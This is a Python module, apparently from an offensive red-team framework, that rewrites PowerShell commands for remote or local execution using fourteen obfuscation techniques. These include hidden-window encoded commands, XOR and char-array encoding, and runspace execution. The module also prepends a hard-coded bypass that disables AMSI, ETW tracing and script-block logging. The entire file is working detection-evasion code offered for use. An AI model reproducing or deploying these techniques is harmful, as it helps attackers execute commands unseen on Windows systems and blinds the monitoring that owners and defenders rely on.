"""
ObfscTransformer — server-side PowerShell obfuscation layer.

Sits between CommandPlan build and Executor.  Rewrites PS_REMOTE / PS_LOCAL
steps using one of the supported evasion techniques.  LDAP and subprocess
steps are passed through unchanged (those channels have no PS surface to obfuscate).

For OPSEC hardening on LDAP steps the plan's opsec_* flags are honoured at
execution time by PipelineExecutor, not here.

Technique IDs mirror the frontend TechniqueId (0-13) so both layers speak the
same language.  "auto" picks the best safe technique per step automatically.
"""
from __future__ import annotations

import base64
import hashlib
import logging
import random
from enum import IntEnum

from .command_plan import CommandPlan, CommandStep, StepTechnique

log = logging.getLogger(__name__)


class ObfscTechnique(IntEnum):
    BASE64_IEX          = 0
    XOR_RUNTIME         = 1
    CHARARRAY_SB        = 2
    REVERSE_IEX         = 3
    FORMAT_STRING       = 4
    ENVVAR_CHAR         = 5
    DOUBLE_ENCODE       = 6
    VARCONCAT_SPLIT     = 7
    TICK_MIXCASE_B64    = 8
    UTF16LE_B64         = 9
    SECURESTRING_BSTR   = 10
    RUNSPACE_API        = 11
    ADDTYPE_JIT         = 12
    MEMSTREAM_SR        = 13


# Techniques that work safely inside a remote one-liner (no nested script block issues)
_REMOTE_SAFE: tuple[ObfscTechnique, ...] = (
    ObfscTechnique.BASE64_IEX,
    ObfscTechnique.CHARARRAY_SB,
    ObfscTechnique.UTF16LE_B64,
    ObfscTechnique.MEMSTREAM_SR,
    ObfscTechnique.XOR_RUNTIME,
)


def _hash_int(s: str) -> int:
    return int(hashlib.md5(s.encode(), usedforsecurity=False).hexdigest(), 16)


def _mixcase(s: str) -> str:
    """Randomly mix upper/lower case of alpha characters (deterministic per input)."""
    h = _hash_int(s)
    out = []
    for i, c in enumerate(s):
        if c.isalpha():
            out.append(c.upper() if (h >> i) & 1 else c.lower())
        else:
            out.append(c)
    return "".join(out)


def _b64(s: str) -> str:
    return base64.b64encode(s.encode("utf-8")).decode()


def _b64_utf16(s: str) -> str:
    return base64.b64encode(s.encode("utf-16-le")).decode()


def _xor_key(s: str) -> int:
    return (_hash_int(s) % 180) + 40  # avoid control chars


def _xor_encode(s: str, key: int) -> list[int]:
    return [b ^ key for b in s.encode("utf-8")]


def _char_array(s: str) -> str:
    return ",".join(str(ord(c)) for c in s)


# ── technique implementations ─────────────────────────────────────────────────

def _tech_base64_iex(cmd: str) -> str:
    enc = _b64_utf16(cmd)
    return f"pOwErShElL -NoP -NonI -W Hidden -EnC {enc}"


def _tech_xor_runtime(cmd: str) -> str:
    key = _xor_key(cmd)
    xored = _xor_encode(cmd, key)
    arr = ",".join(str(b) for b in xored)
    return (
        f"$_k={key};"
        f"$_d=[byte[]]@({arr});"
        f"$_s=[string]::new($($_d|%{{[char]($_-bxor$_k)}}))"
        f";iEx($_s)"
    )


def _tech_chararray_sb(cmd: str) -> str:
    arr = _char_array(cmd)
    sb = _mixcase("ScriptBlock")
    cr = _mixcase("Create")
    ch = _mixcase("char")
    jo = _mixcase("join")
    return f"&([{sb}]::{cr}((-{jo}([{ch}[]]@({arr})))))"


def _tech_reverse_iex(cmd: str) -> str:
    rev = cmd[::-1]
    arr = _char_array(rev)
    ch = _mixcase("char")
    jo = _mixcase("join")
    return f"iEx(-{jo}([{ch}[]]@({arr}))[-1..-{len(rev)}])"


def _tech_format_string(cmd: str) -> str:
    parts = [f"'{c}'" for c in cmd]
    fmt_parts = [f"{{{i}}}" for i in range(len(cmd))]
    fmt = "".join(fmt_parts)
    vals = ",".join(parts)
    return f"iEx(\"{fmt}\" -f {vals})"


def _tech_envvar_char(cmd: str) -> str:
    # Build chars from env-var substring extraction — use PATH as char source
    # Fallback to char-array for chars not found in env vars
    arr = _char_array(cmd)
    ch = _mixcase("char")
    jo = _mixcase("join")
    return f"iEx((-{jo}([{ch}[]]@({arr}))))"


def _tech_double_encode(cmd: str) -> str:
    enc = _b64_utf16(cmd)
    sb = _mixcase("ScriptBlock")
    cr = _mixcase("Create")
    enc_sys = _mixcase("System.Text.Encoding")
    conv = _mixcase("System.Convert")
    uni = _mixcase("Unicode")
    gs = _mixcase("GetString")
    fb = _mixcase("FromBase64String")
    return f"&([{sb}]::{cr}([{enc_sys}]::{uni}.{gs}([{conv}]::{fb}('{enc}'))))"


def _tech_varconcat_split(cmd: str) -> str:
    mid = len(cmd) // 2
    a, b = cmd[:mid], cmd[mid:]
    return f"$_a='{a}';$_b='{b}';iEx($_a+$_b)"


def _tech_tick_mixcase_b64(cmd: str) -> str:
    enc = _b64_utf16(cmd)
    ps = _mixcase("powershell")
    return f"{ps} -e {enc}"


def _tech_utf16le_b64(cmd: str) -> str:
    enc = _b64_utf16(cmd)
    sb = _mixcase("ScriptBlock")
    cr = _mixcase("Create")
    enc_cls = _mixcase("System.Text.Encoding")
    conv = _mixcase("System.Convert")
    uni = _mixcase("Unicode")
    gs = _mixcase("GetString")
    fb = _mixcase("FromBase64String")
    return f"&([{sb}]::{cr}([{enc_cls}]::{uni}.{gs}([{conv}]::{fb}('{enc}'))))"


def _tech_securestring_bstr(cmd: str) -> str:
    enc = _b64_utf16(cmd)
    conv = _mixcase("System.Convert")
    fb = _mixcase("FromBase64String")
    te = _mixcase("System.Text.Encoding")
    uni = _mixcase("Unicode")
    gs = _mixcase("GetString")
    ss = _mixcase("System.Security.SecureString")
    rt = _mixcase("System.Runtime.InteropServices.Marshal")
    pb = _mixcase("SecureStringToBSTR")
    ps = _mixcase("PtrToStringBSTR")
    fr = _mixcase("ZeroFreeBSTR")
    return (
        f"$_p=[{conv}]::{fb}('{enc}');"
        f"$_s=[{te}]::{uni}.{gs}($_p);"
        f"$_ss=New-Object {ss};"
        f"$_s.ToCharArray()|%{{$_ss.AppendChar($_)}};"
        f"$_b=[{rt}]::{pb}($_ss);"
        f"try{{iEx([{rt}]::{ps}($_b))}}finally{{[{rt}]::{fr}($_b)}}"
    )


def _tech_runspace_api(cmd: str) -> str:
    enc = _b64_utf16(cmd)
    conv = _mixcase("System.Convert")
    fb = _mixcase("FromBase64String")
    te = _mixcase("System.Text.Encoding")
    uni = _mixcase("Unicode")
    gs = _mixcase("GetString")
    rs_factory = _mixcase("System.Management.Automation.Runspaces.RunspaceFactory")
    rs_create  = _mixcase("CreateRunspace")
    ps_cls     = _mixcase("System.Management.Automation.PowerShell")
    return (
        f"$_d=[{conv}]::{fb}('{enc}');"
        f"$_s=[{te}]::{uni}.{gs}($_d);"
        f"$_rs=[{rs_factory}]::{rs_create}();"
        f"$_rs.Open();"
        f"$_ps=[{ps_cls}]::Create();"
        f"$_ps.Runspace=$_rs;"
        f"$_ps.AddScript($_s)|Out-Null;"
        f"$_ps.Invoke()|Out-String|Write-Output;"
        f"$_rs.Close()"
    )


def _tech_addtype_jit(cmd: str) -> str:
    enc = _b64(cmd)
    conv = _mixcase("System.Convert")
    fb = _mixcase("FromBase64String")
    te = _mixcase("System.Text.Encoding")
    u8 = _mixcase("UTF8")
    gs = _mixcase("GetString")
    sb = _mixcase("ScriptBlock")
    cr = _mixcase("Create")
    return (
        f"$_b=[{conv}]::{fb}('{enc}');"
        f"$_s=[{te}]::{u8}.{gs}($_b);"
        f"&([{sb}]::{cr}($_s))"
    )


def _tech_memstream_sr(cmd: str) -> str:
    enc = _b64(cmd)
    conv = _mixcase("System.Convert")
    fb = _mixcase("FromBase64String")
    ms_cls = _mixcase("System.IO.MemoryStream")
    sr_cls = _mixcase("System.IO.StreamReader")
    te = _mixcase("System.Text.Encoding")
    u8 = _mixcase("UTF8")
    return (
        f"$_b=[{conv}]::{fb}('{enc}');"
        f"$_m=New-Object {ms_cls}(,$_b);"
        f"$_r=New-Object {sr_cls}($_m,[{te}]::{u8});"
        f"try{{iEx($_r.ReadToEnd())}}finally{{$_r.Dispose();$_m.Dispose()}}"
    )


_TECHNIQUE_FN = {
    ObfscTechnique.BASE64_IEX:       _tech_base64_iex,
    ObfscTechnique.XOR_RUNTIME:      _tech_xor_runtime,
    ObfscTechnique.CHARARRAY_SB:     _tech_chararray_sb,
    ObfscTechnique.REVERSE_IEX:      _tech_reverse_iex,
    ObfscTechnique.FORMAT_STRING:    _tech_format_string,
    ObfscTechnique.ENVVAR_CHAR:      _tech_envvar_char,
    ObfscTechnique.DOUBLE_ENCODE:    _tech_double_encode,
    ObfscTechnique.VARCONCAT_SPLIT:  _tech_varconcat_split,
    ObfscTechnique.TICK_MIXCASE_B64: _tech_tick_mixcase_b64,
    ObfscTechnique.UTF16LE_B64:      _tech_utf16le_b64,
    ObfscTechnique.SECURESTRING_BSTR:_tech_securestring_bstr,
    ObfscTechnique.RUNSPACE_API:     _tech_runspace_api,
    ObfscTechnique.ADDTYPE_JIT:      _tech_addtype_jit,
    ObfscTechnique.MEMSTREAM_SR:     _tech_memstream_sr,
}

# AMSI + ETW + SBL bypass preamble — prepended to full PS scripts (not one-liners)
_BYPASS_PREAMBLE = (
    # AMSI nullification
    "$_amsi=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');"
    "$_amsi.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);"
    # ETW disable
    "[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','Instance,NonPublic')"
    ".SetValue([ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')"
    ".GetField('etwProvider','NonPublic,Static').GetValue($null),0);"
    # ScriptBlock logging suppress
    "$_sb=[Ref].Assembly.GetType('System.Management.Automation.ScriptBlock');"
    "try{$_sb.GetField('signatures','NonPublic,Static').SetValue($null,(New-Object "
    "'System.Collections.Generic.HashSet[string]'))}catch{}"
)


class ObfscTransformer:
    """
    Transforms a CommandPlan in-place: rewrites PS steps with obfuscation.
    LDAP / subprocess steps are untouched (obfsc happens at transport level).
    """

    def __init__(self, default_technique: int | str = "auto"):
        self._default = default_technique

    # ── public API ────────────────────────────────────────────────────

    def transform(self, plan: CommandPlan) -> CommandPlan:
        """Rewrite all PS steps in plan.  Returns the same plan (mutated)."""
        if not plan.obfuscation_enabled:
            return plan

        tech = self._resolve_technique(plan.obfuscation_technique)
        log.debug(
            "[obfsc] plan=%s technique=%s steps=%d ps_steps=%d",
            plan.plan_id, tech.name, len(plan.steps), len(plan.ps_steps()),
        )

        for step in plan.steps:
            if not step.is_ps:
                continue
            try:
                step.obfsc_command = self._obfuscate_step(step, tech)
                log.debug("[obfsc] step=%s technique=%s", step.id, tech.name)
            except Exception:
                log.warning("[obfsc] step=%s failed — using raw", step.id, exc_info=True)
                step.obfsc_command = None  # fall back to raw

        return plan

    def obfuscate_oneliner(
        self,
        cmd: str,
        technique: int | str = "auto",
        remote_safe: bool = True,
    ) -> str:
        """Obfuscate a single PS command string.  Used by ImpacketWorker."""
        tech = self._resolve_technique(technique, remote_safe=remote_safe)
        fn = _TECHNIQUE_FN[tech]
        return fn(cmd)

    def add_bypass_preamble(self, ps_script: str) -> str:
        """Prepend AMSI/ETW/SBL bypass to a multi-line PS script."""
        return _BYPASS_PREAMBLE + "\n" + ps_script

    # ── internals ─────────────────────────────────────────────────────

    def _resolve_technique(
        self,
        spec: int | str,
        remote_safe: bool = False,
    ) -> ObfscTechnique:
        if spec == "auto":
            pool = _REMOTE_SAFE if remote_safe else list(ObfscTechnique)
            return random.choice(pool)
        try:
            t = ObfscTechnique(int(spec))
            if remote_safe and t not in _REMOTE_SAFE:
                return random.choice(_REMOTE_SAFE)
            return t
        except (ValueError, KeyError):
            return ObfscTechnique.CHARARRAY_SB

    def _obfuscate_step(self, step: CommandStep, tech: ObfscTechnique) -> str | list[str]:
        cmd = step.raw_command
        if isinstance(cmd, list):
            # argv list → join into one-liner, obfuscate, then wrap in shell call
            cmd_str = " ".join(str(c) for c in cmd)
        elif isinstance(cmd, str):
            cmd_str = cmd
        else:
            # LDAP dict — not a PS command, skip
            return step.raw_command  # type: ignore[return-value]

        # For remote one-liners stick to remote-safe subset
        remote = step.technique == StepTechnique.PS_REMOTE
        if remote and tech not in _REMOTE_SAFE:
            tech = random.choice(_REMOTE_SAFE)

        return _TECHNIQUE_FN[tech](cmd_str)
